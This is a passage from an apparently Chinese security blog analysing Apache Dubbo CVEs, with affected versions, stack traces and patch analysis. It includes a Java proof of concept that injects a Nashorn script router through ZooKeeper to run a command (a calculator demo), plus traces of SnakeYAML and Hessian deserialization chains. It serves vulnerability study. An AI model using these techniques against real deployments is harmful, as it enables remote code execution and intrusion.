(java.util.concurrent)</span><br><span class="line">dataChanged:130, CacheListener (org.apache.dubbo.configcenter.support.zookeeper)</span><br><span class="line">childEvent:336, CuratorZookeeperClient$CuratorWatcherImpl (org.apache.dubbo.remoting.zookeeper.curator)</span><br><span class="line">apply:749, TreeCache$2 (org.apache.curator.framework.recipes.cache)</span><br><span class="line">apply:743, TreeCache$2 (org.apache.curator.framework.recipes.cache)</span><br><span class="line">run:93, ListenerContainer$1 (org.apache.curator.framework.listen)</span><br><span class="line">runWorker:1142, ThreadPoolExecutor (java.util.concurrent)</span><br><span class="line">run:617, ThreadPoolExecutor$Worker (java.util.concurrent)</span><br><span class="line">run:745, Thread (java.lang)</span><br></pre></td></tr></table></figure><h3 id="9-3-补丁分析"><a href="#9-3-补丁分析" class="headerlink" title="9.3 补丁分析"></a>9.3 补丁分析</h3><p>Tag Router<br><img src="/images/pasted-504.png" alt="upload successful"></p><p>Condition Router<br><img src="/images/pasted-503.png" alt="upload successful"></p><p>Config<br><img src="/images/pasted-506.png" alt="upload successful"></p><h2 id="0x10-CVE-2021-30181"><a href="#0x10-CVE-2021-30181" class="headerlink" title="0x10 CVE-2021-30181"></a>0x10 CVE-2021-30181</h2><h3 id="10-1-影响版本"><a href="#10-1-影响版本" class="headerlink" title="10.1 影响版本"></a>10.1 影响版本</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">2.7.0&lt;&#x3D;Dubbo&lt;&#x3D;2.7.9</span><br><span class="line">2.6.0&lt;&#x3D;Dubbo&lt;&#x3D;2.6.9</span><br><span class="line">2.5.x</span><br></pre></td></tr></table></figure><p>与以往的漏洞都是攻击provider 不同，这两个漏洞攻击的是consumer</p><h3 id="10-2-漏洞分析"><a href="#10-2-漏洞分析" class="headerlink" title="10.2 漏洞分析"></a>10.2 漏洞分析</h3><p>参考<a href="https://cn.dubbo.apache.org/en/docs/v2.7/user/examples/routing-rule/#script-routing-rules">https://cn.dubbo.apache.org/en/docs/v2.7/user/examples/routing-rule/#script-routing-rules</a></p><h4 id="10-2-1-Script-路由"><a href="#10-2-1-Script-路由" class="headerlink" title="10.2.1 Script 路由"></a>10.2.1 Script 路由</h4><p>script 路由支持</p><ul><li>javascript, default</li><li>groovy</li><li>jruby</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    String service_name=<span class="string">&quot;org.apache.dubbo.samples.governance.api.DemoService&quot;</span>;</span><br><span class="line">    <span class="comment">// https://mbechler.github.io/2019/03/02/Beware-the-Nashorn/</span></span><br><span class="line">    String payload = <span class="string">&quot;this.engine.factory.scriptEngine.eval(&#x27;java.lang.Runtime.getRuntime().exec(\\\&quot;open -a calculator\\\&quot;)&#x27;);&quot;</span>;</span><br><span class="line"></span><br><span class="line">    RegistryFactory registryFactory = ExtensionLoader.getExtensionLoader(RegistryFactory.class).getAdaptiveExtension();</span><br><span class="line">    Registry registry = registryFactory.getRegistry(URL.valueOf(<span class="string">&quot;zookeeper://127.0.0.1:2181&quot;</span>));</span><br><span class="line">    registry.register(URL.valueOf(<span class="string">&quot;script://0.0.0.0/&quot;</span> + service_name + <span class="string">&quot;?category=routers&amp;dynamic=false&amp;rule=&quot;</span> + URL.encode(<span class="string">&quot;(function route(invokers) &#123; &quot;</span> + payload + <span class="string">&quot; return invokers; &#125; (invokers))&quot;</span>)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="10-2-2-漏洞"><a href="#10-2-2-漏洞" class="headerlink" title="10.2.2 漏洞"></a>10.2.2 漏洞</h4><p>script router需要在真实route 阶段才会触发，不像tag router/condition router在预加载路由策略的时候。<br>router 信息也没有保存在register /dubbo/config/dubbo 路径，而是保存在/dubbo/xxx.api/routers 路径</p><p><img src="/images/pasted-656.png" alt="upload successful"></p><p><img src="/images/pasted-507.png" alt="upload successful"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">start:1007, ProcessBuilder (java.lang)</span><br><span class="line">exec:620, Runtime (java.lang)</span><br><span class="line">exec:450, Runtime (java.lang)</span><br><span class="line">exec:347, Runtime (java.lang)</span><br><span class="line">invokeVirtual_LL_L:-1, 1041109062 (java.lang.invoke.LambdaForm$DMH)</span><br><span class="line">reinvoke:-1, 1171094469 (java.lang.invoke.LambdaForm$BMH)</span><br><span class="line">exactInvoker:-1, 646410842 (java.lang.invoke.LambdaForm$MH)</span><br><span class="line">linkToCallSite:-1, 1517677623 (java.lang.invoke.LambdaForm$MH)</span><br><span class="line">:program:1, Script$2$\^eval\_ (jdk.nashorn.internal.scripts)</span><br><span class="line">invokeStatic_LL_L:-1, 318857719 (java.lang.invoke.LambdaForm$DMH)</span><br><span class="line">invokeExact_MT:-1, 987805552 (java.lang.invoke.LambdaForm$MH)</span><br><span class="line">invoke:640, ScriptFunctionData (jdk.nashorn.internal.runtime)</span><br><span class="line">invoke:228, ScriptFunction (jdk.nashorn.internal.runtime)</span><br><span class="line">apply:393, ScriptRuntime (jdk.nashorn.internal.runtime)</span><br><span class="line">evalImpl:446, NashornScriptEngine (jdk.nashorn.api.scripting)</span><br><span class="line">evalImpl:403, NashornScriptEngine (jdk.nashorn.api.scripting)</span><br><span class="line">evalImpl:399, NashornScriptEngine (jdk.nashorn.api.scripting)</span><br><span class="line">eval:155, NashornScriptEngine (jdk.nashorn.api.scripting)</span><br><span class="line">eval:264, AbstractScriptEngine (javax.script)</span><br><span class="line">invokeVirtual_LL_L:-1, 1041109062 (java.lang.invoke.LambdaForm$DMH)</span><br><span class="line">reinvoke:-1, 1709225221 (java.lang.invoke.LambdaForm$BMH)</span><br><span class="line">exactInvoker:-1, 646410842 (java.lang.invoke.LambdaForm$MH)</span><br><span class="line">linkToCallSite:-1, 1517677623 (java.lang.invoke.LambdaForm$MH)</span><br><span class="line">route:1, Script$Recompilation$1$26A$\^eval\_ (jdk.nashorn.internal.scripts)</span><br><span class="line">invokeStatic_LL_L:-1, 318857719 (java.lang.invoke.LambdaForm$DMH)</span><br><span class="line">reinvoke:-1, 954723689 (java.lang.invoke.LambdaForm$BMH)</span><br><span class="line">exactInvoker:-1, 646410842 (java.lang.invoke.LambdaForm$MH)</span><br><span class="line">linkToCallSite:-1, 1517677623 (java.lang.invoke.LambdaForm$MH)</span><br><span class="line">:program:1, Script$\^eval\_ (jdk.nashorn.internal.scripts)</span><br><span class="line">invokeStatic_LL_L:-1, 318857719 (java.lang.invoke.LambdaForm$DMH)</span><br><span class="line">invokeExact_MT:-1, 987805552 (java.lang.invoke.LambdaForm$MH)</span><br><span class="line">invoke:640, ScriptFunctionData (jdk.nashorn.internal.runtime)</span><br><span class="line">invoke:228, ScriptFunction (jdk.nashorn.internal.runtime)</span><br><span class="line">apply:393, ScriptRuntime (jdk.nashorn.internal.runtime)</span><br><span class="line">evalImpl:418, NashornScriptEngine (jdk.nashorn.api.scripting)</span><br><span class="line">access$300:73, NashornScriptEngine (jdk.nashorn.api.scripting)</span><br><span class="line">eval:511, NashornScriptEngine$3 (jdk.nashorn.api.scripting)</span><br><span class="line">eval:92, CompiledScript (javax.script)</span><br><span class="line">route:115, ScriptRouter (org.apache.dubbo.rpc.cluster.router.script)</span><br><span class="line">route:99, RouterChain (org.apache.dubbo.rpc.cluster)</span><br><span class="line">doList:520, RegistryDirectory (org.apache.dubbo.registry.integration)</span><br><span class="line">list:87, AbstractDirectory (org.apache.dubbo.rpc.cluster.directory)</span><br><span class="line">list:297, AbstractClusterInvoker (org.apache.dubbo.rpc.cluster.support)</span><br><span class="line">invoke:262, AbstractClusterInvoker (org.apache.dubbo.rpc.cluster.support)</span><br><span class="line">intercept:47, ClusterInterceptor (org.apache.dubbo.rpc.cluster.interceptor)</span><br><span class="line">invoke:92, AbstractCluster$InterceptorInvokerNode (org.apache.dubbo.rpc.cluster.support.wrapper)</span><br><span class="line">invoke:93, MockClusterInvoker (org.apache.dubbo.rpc.cluster.support.wrapper)</span><br><span class="line">invoke:132, InterfaceCompatibleRegistryProtocol$MigrationInvoker (org.apache.dubbo.registry.integration)</span><br><span class="line">invoke:83, InvokerInvocationHandler (org.apache.dubbo.rpc.proxy)</span><br><span class="line">sayHello:-1, proxy0 (org.apache.dubbo.common.bytecode)</span><br><span class="line">main:41, BasicConsumer (org.apache.dubbo.samples.governance)</span><br></pre></td></tr></table></figure><h3 id="10-3-补丁分析"><a href="#10-3-补丁分析" class="headerlink" title="10.3 补丁分析"></a>10.3 补丁分析</h3><ol><li><p>增加Security Manager控制<br><img src="/images/pasted-505.png" alt="upload successful"></p></li><li><p>SPI</p></li></ol><p><img src="/images/pasted-508.png" alt="upload successful"></p><p>RouterFactory 是SPI扩展，默认ScriptRouterFactory 是非active，用时加载，在2.7.10中，直接移除了SPI配置。<br><img src="/images/pasted-509.png" alt="upload successful"></p><p>具体逻辑在RegistryDirectory#toRouters 中。<br><img src="/images/pasted-510.png" alt="upload successful"></p><h2 id="0x11-CVE-2021-36162"><a href="#0x11-CVE-2021-36162" class="headerlink" title="0x11 CVE-2021-36162"></a>0x11 CVE-2021-36162</h2><h3 id="11-1-影响版本"><a href="#11-1-影响版本" class="headerlink" title="11.1 影响版本"></a>11.1 影响版本</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3.0&lt;&#x3D;Dubbo&lt;&#x3D;3.0.1</span><br></pre></td></tr></table></figure><h3 id="11-2-漏洞分析"><a href="#11-2-漏洞分析" class="headerlink" title="11.2 漏洞分析"></a>11.2 漏洞分析</h3><h4 id="11-2-1-Mesh-路由"><a href="#11-2-1-Mesh-路由" class="headerlink" title="11.2.1 Mesh 路由"></a>11.2.1 Mesh 路由</h4><p>参考 <a href="https://cn.dubbo.apache.org/zh-cn/overview/mannual/java-sdk/advanced-features-and-usage/traffic/mesh-style/">https://cn.dubbo.apache.org/zh-cn/overview/mannual/java-sdk/advanced-features-and-usage/traffic/mesh-style/</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line">start:1007, ProcessBuilder (java.lang)</span><br><span class="line">exec:620, Runtime (java.lang)</span><br><span class="line">exec:450, Runtime (java.lang)</span><br><span class="line">exec:347, Runtime (java.lang)</span><br><span class="line">&lt;init&gt;:18, PocScriptEngineFactory (pocsnakeyaml)</span><br><span class="line">newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:62, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:422, Constructor (java.lang.reflect) [2]</span><br><span class="line">newInstance:442, Class (java.lang)</span><br><span class="line">nextService:380, ServiceLoader$LazyIterator (java.util)</span><br><span class="line">next:404, ServiceLoader$LazyIterator (java.util)</span><br><span class="line">next:480, ServiceLoader$1 (java.util)</span><br><span class="line">initEngines:122, ScriptEngineManager (javax.script)</span><br><span class="line">init:84, ScriptEngineManager (javax.script)</span><br><span class="line">&lt;init&gt;:75, ScriptEngineManager (javax.script)</span><br><span class="line">newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:62, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:422, Constructor (java.lang.reflect) [1]</span><br><span class="line">construct:550, Constructor$ConstructSequence (org.yaml.snakeyaml.constructor)</span><br><span class="line">construct:310, Constructor$ConstructYamlObject (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructObjectNoCheck:207, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructObject:196, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructSequenceStep2:373, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructSequence:357, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">construct:500, SafeConstructor$ConstructYamlSeq (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructObjectNoCheck:207, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructObject:196, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructMapping2ndStep:462, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructMapping2ndStep:184, SafeConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructMapping:443, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">construct:521, SafeConstructor$ConstructYamlMap (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructObjectNoCheck:207, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructObject:196, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructMapping2ndStep:462, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructMapping2ndStep:184, SafeConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructMapping:443, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">construct:521, SafeConstructor$ConstructYamlMap (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructObjectNoCheck:207, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructObject:196, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">constructDocument:161, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">getData:127, BaseConstructor (org.yaml.snakeyaml.constructor)</span><br><span class="line">next:547, Yaml$1 (org.yaml.snakeyaml)</span><br><span class="line">receiveConfigInfo:62, MeshAppRuleListener (org.apache.dubbo.rpc.cluster.router.mesh.route)</span><br><span class="line">subscribeAppRule:53, MeshRuleManager (org.apache.dubbo.rpc.cluster.router.mesh.route)</span><br><span class="line">notify:43, MeshRuleAddressListenerInterceptor (org.apache.dubbo.rpc.cluster.router.mesh.route)</span><br><span class="line">notify:145, RegistryDirectory (org.apache.dubbo.registry.integration)</span><br><span class="line">notify:433, AbstractRegistry (org.apache.dubbo.registry.support)</span><br><span class="line">doNotify:371, FailbackRegistry (org.apache.dubbo.registry.support)</span><br><span class="line">notify:363, FailbackRegistry (org.apache.dubbo.registry.support)</span><br><span class="line">doSubscribe:180, ZookeeperRegistry (org.apache.dubbo.registry.zookeeper)</span><br><span class="line">subscribe:298, FailbackRegistry (org.apache.dubbo.registry.support)</span><br><span class="line">subscribe:106, ListenerRegistryWrapper (org.apache.dubbo.registry)</span><br><span class="line">subscribe:107, RegistryDirectory (org.apache.dubbo.registry.integration)</span><br><span class="line">doCreateInvoker:514, RegistryProtocol (org.apache.dubbo.registry.integration)</span><br><span class="line">getInvoker:58, InterfaceCompatibleRegistryProtocol (org.apache.dubbo.registry.integration)</span><br><span class="line">refreshInterfaceInvoker:448, MigrationInvoker (org.apache.dubbo.registry.client.migration)</span><br><span class="line">migrateToApplicationFirstInvoker:239, MigrationInvoker (org.apache.dubbo.registry.client.migration)</span><br><span class="line">refreshInvoker:73, MigrationRuleHandler (org.apache.dubbo.registry.client.migration)</span><br><span class="line">doMigrate:57, MigrationRuleHandler (org.apache.dubbo.registry.client.migration)</span><br><span class="line">onRefer:208, MigrationRuleListener (org.apache.dubbo.registry.client.migration)</span><br><span class="line">interceptInvoker:485, RegistryProtocol (org.apache.dubbo.registry.integration)</span><br><span class="line">doRefer:467, RegistryProtocol (org.apache.dubbo.registry.integration)</span><br><span class="line">refer:452, RegistryProtocol (org.apache.dubbo.registry.integration)</span><br><span class="line">refer:74, ProtocolListenerWrapper (org.apache.dubbo.rpc.protocol)</span><br><span class="line">refer:68, ProtocolFilterWrapper (org.apache.dubbo.rpc.cluster.filter)</span><br><span class="line">refer:73, QosProtocolWrapper (org.apache.dubbo.qos.protocol)</span><br><span class="line">refer:-1, Protocol$Adaptive (org.apache.dubbo.rpc)</span><br><span class="line">createProxy:392, ReferenceConfig (org.apache.dubbo.config)</span><br><span class="line">init:328, ReferenceConfig (org.apache.dubbo.config)</span><br><span class="line">get:205, ReferenceConfig (org.apache.dubbo.config)</span><br><span class="line">lambda$get$3:114, ReferenceConfigCache (org.apache.dubbo.config.utils)</span><br><span class="line">apply:-1, 843686350 (org.apache.dubbo.config.utils.ReferenceConfigCache$$Lambda$103)</span><br><span class="line">computeIfAbsent:1660, ConcurrentHashMap (java.util.concurrent)</span><br><span class="line">get:113, ReferenceConfigCache (org.apache.dubbo.config.utils)</span><br><span class="line">lambda$referServices$8:1348, DubboBootstrap (org.apache.dubbo.config.bootstrap)</span><br><span class="line">accept:-1, 1232433403 (org.apache.dubbo.config.bootstrap.DubboBootstrap$$Lambda$101)</span><br><span class="line">forEach:600, LinkedHashMap$LinkedValues (java.util)</span><br><span class="line">referServices:1327, DubboBootstrap (org.apache.dubbo.config.bootstrap)</span><br><span class="line">start:1106, DubboBootstrap (org.apache.dubbo.config.bootstrap)</span><br><span class="line">onContextRefreshedEvent:80, DubboBootstrapApplicationListener (org.apache.dubbo.config.spring.context)</span><br><span class="line">onApplicationContextEvent:72, DubboBootstrapApplicationListener (org.apache.dubbo.config.spring.context)</span><br><span class="line">onApplicationEvent:52, OnceApplicationContextEventListener (com.alibaba.spring.context)</span><br><span class="line">doInvokeListener:172, SimpleApplicationEventMulticaster (org.springframework.context.event)</span><br><span class="line">invokeListener:165, SimpleApplicationEventMulticaster (org.springframework.context.event)</span><br><span class="line">multicastEvent:139, SimpleApplicationEventMulticaster (org.springframework.context.event)</span><br><span class="line">publishEvent:393, AbstractApplicationContext (org.springframework.context.support)</span><br><span class="line">publishEvent:347, AbstractApplicationContext (org.springframework.context.support)</span><br><span class="line">finishRefresh:883, AbstractApplicationContext (org.springframework.context.support)</span><br><span class="line">refresh:545, AbstractApplicationContext (org.springframework.context.support)</span><br><span class="line">&lt;init&gt;:139, ClassPathXmlApplicationContext (org.springframework.context.support)</span><br><span class="line">&lt;init&gt;:83, ClassPathXmlApplicationContext (org.springframework.context.support)</span><br><span class="line">main:31, BasicConsumer (org.apache.dubbo.samples.governance)</span><br></pre></td></tr></table></figure><h3 id="11-3-补丁分析"><a href="#11-3-补丁分析" class="headerlink" title="11.3 补丁分析"></a>11.3 补丁分析</h3><p><img src="/images/pasted-511.png" alt="upload successful"></p><h2 id="0x12-CVE-2021-36163"><a href="#0x12-CVE-2021-36163" class="headerlink" title="0x12 CVE-2021-36163"></a>0x12 CVE-2021-36163</h2><h3 id="12-1-影响版本"><a href="#12-1-影响版本" class="headerlink" title="12.1 影响版本"></a>12.1 影响版本</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2.7.0&lt;&#x3D;Dubbo&lt;&#x3D;2.7.12</span><br><span class="line">2.6.0&lt;&#x3D;Dubbo&lt;2.6.10.1</span><br></pre></td></tr></table></figure><h3 id="12-2-漏洞分析"><a href="#12-2-漏洞分析" class="headerlink" title="12.2 漏洞分析"></a>12.2 漏洞分析</h3><h4 id="12-2-1-hessian-协议"><a href="#12-2-1-hessian-协议" class="headerlink" title="12.2.1 hessian 协议"></a>12.2.1 hessian 协议</h4><p><a href="https://cn.dubbo.apache.org/en/docs/v2.7/user/references/protocol/hessian/">dubbo 支持的协议</a></p><ul><li>dubbo://</li><li>rest://</li><li>http://</li><li>redis://</li><li>thrift://</li><li>memcached://</li><li>rmi://</li><li>webservice://</li><li>hessian：//</li></ul><p><a href="https://cn.dubbo.apache.org/zh-cn/overview/what/ecosystem/serialization/">dubbo 支持的反序列化</a></p><ul><li>Hessian</li><li>Fastjson2</li><li>Protobuf</li><li>Fastjson</li><li>Avro</li><li>FST</li><li>Gson</li><li>Kyro</li><li>MessagePack</li></ul><p>还有个协议就叫hessian，看起来和http类似</p><p><img src="/images/pasted-512.png" alt="upload successful"></p><h4 id="12-2-2-漏洞"><a href="#12-2-2-漏洞" class="headerlink" title="12.2.2 漏洞"></a>12.2.2 漏洞</h4><p>Hessian 协议就是一个简单的http协议，在HessianSkeleton 的处理中会对POST 的内容进行反序列化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    skeleton.invoke(request.getInputStream(), response.getOutputStream());</span><br><span class="line">&#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> ServletException(e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>HessianSkeleton 没有任何的反序列化安全措施，因此不受dubbo的黑名单影响。</p><p><img src="/images/pasted-513.png" alt="upload successful"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">lookup:417, InitialContext (javax.naming)</span><br><span class="line">doInContext:155, JndiTemplate$1 (org.springframework.jndi)</span><br><span class="line">execute:87, JndiTemplate (org.springframework.jndi)</span><br><span class="line">lookup:152, JndiTemplate (org.springframework.jndi)</span><br><span class="line">lookup:179, JndiTemplate (org.springframework.jndi)</span><br><span class="line">lookup:95, JndiLocatorSupport (org.springframework.jndi)</span><br><span class="line">doGetSingleton:218, SimpleJndiBeanFactory (org.springframework.jndi.support)</span><br><span class="line">getBean:112, SimpleJndiBeanFactory (org.springframework.jndi.support)</span><br><span class="line">getAdvice:109, AbstractBeanFactoryPointcutAdvisor (org.springframework.aop.support)</span><br><span class="line">equals:74, AbstractPointcutAdvisor (org.springframework.aop.support)</span><br><span class="line">putVal:634, HashMap (java.util)</span><br><span class="line">put:611, HashMap (java.util)</span><br><span class="line">readMap:114, MapDeserializer (com.caucho.hessian.io)</span><br><span class="line">readMap:522, SerializerFactory (com.caucho.hessian.io)</span><br><span class="line">readObject:2079, Hessian2Input (com.caucho.hessian.io)</span><br><span class="line">readLengthList:599, BasicDeserializer (com.caucho.hessian.io)</span><br><span class="line">readObject:1746, Hessian2Input (com.caucho.hessian.io)</span><br><span class="line">invoke:300, HessianSkeleton (com.caucho.hessian.server)</span><br><span class="line">invoke:202, HessianSkeleton (com.caucho.hessian.server)</span><br><span class="line">invoke:143, HessianSkeleton (com.caucho.hessian.server)</span><br><span class="line">handle:193, HessianProtocol$HessianHandler (org.apache.dubbo.rpc.protocol.hessian)</span><br><span class="line">service:61, DispatcherServlet (org.apache.dubbo.remoting.http.servlet)</span><br><span class="line">service:790, HttpServlet (javax.servlet.http)</span><br><span class="line">handle:865, ServletHolder (org.eclipse.jetty.servlet)</span><br><span class="line">doHandle:535, ServletHandler (org.eclipse.jetty.servlet)</span><br><span class="line">nextHandle:255, ScopedHandler (org.eclipse.jetty.server.handler)</span><br><span class="line">doHandle:1595, SessionHandler (org.eclipse.jetty.server.session)</span><br><span class="line">nextHandle:255, ScopedHandler (org.eclipse.jetty.server.handler)</span><br><span class="line">doHandle:1317, ContextHandler (org.eclipse.jetty.server.handler)</span><br><span class="line">nextScope:203, ScopedHandler (org.eclipse.jetty.server.handler)</span><br><span class="line">doScope:473, ServletHandler (org.eclipse.jetty.servlet)</span><br><span class="line">doScope:1564, SessionHandler (org.eclipse.jetty.server.session)</span><br><span class="line">nextScope:201, ScopedHandler (org.eclipse.jetty.server.handler)</span><br><span class="line">doScope:1219, ContextHandler (org.eclipse.jetty.server.handler)</span><br><span class="line">handle:144, ScopedHandler (org.eclipse.jetty.server.handler)</span><br><span class="line">handle:132, HandlerWrapper (org.eclipse.jetty.server.handler)</span><br><span class="line">handle:531, Server (org.eclipse.jetty.server)</span><br><span class="line">handle:352, HttpChannel (org.eclipse.jetty.server)</span><br><span class="line">onFillable:260, HttpConnection (org.eclipse.jetty.server)</span><br><span class="line">succeeded:281, AbstractConnection$ReadCallback (org.eclipse.jetty.io)</span><br><span class="line">fillable:102, FillInterest (org.eclipse.jetty.io)</span><br><span class="line">run:118, ChannelEndPoint$2 (org.eclipse.jetty.io)</span><br><span class="line">runJob:762, QueuedThreadPool (org.eclipse.jetty.util.thread)</span><br><span class="line">run:680, QueuedThreadPool$2 (org.eclipse.jetty.util.thread)</span><br><span class="line">run:745, Thread (java.lang)</span><br></pre></td></tr></table></figure><h3 id="12-3-补丁分析"><a href="#12-3-补丁分析" class="headerlink" title="12.3 补丁分析"></a>12.3 补丁分析</h3><p><a href="https://github.com/apache/dubbo/commit/daf6f25137eabdd5faa60507b58d82b983e52eb7">https://github.com/apache/dubbo/commit/daf6f25137eabdd5faa60507b58d82b983e52eb7</a></p><p><img src="/images/pasted-514.png" alt="upload successful"></p><p>在Hessian2ObjectInput 引入默认的SerializerFactory，其中引入了hessian 黑名单</p><p><img src="/images/pasted-515.png" alt="upload successful"></p><h4 id="12-3-1-安全措施"><a href="#12-3-1-安全措施" class="headerlink" title="12.3.1 安全措施"></a>12.3.1 安全措施</h4><p>Hessian 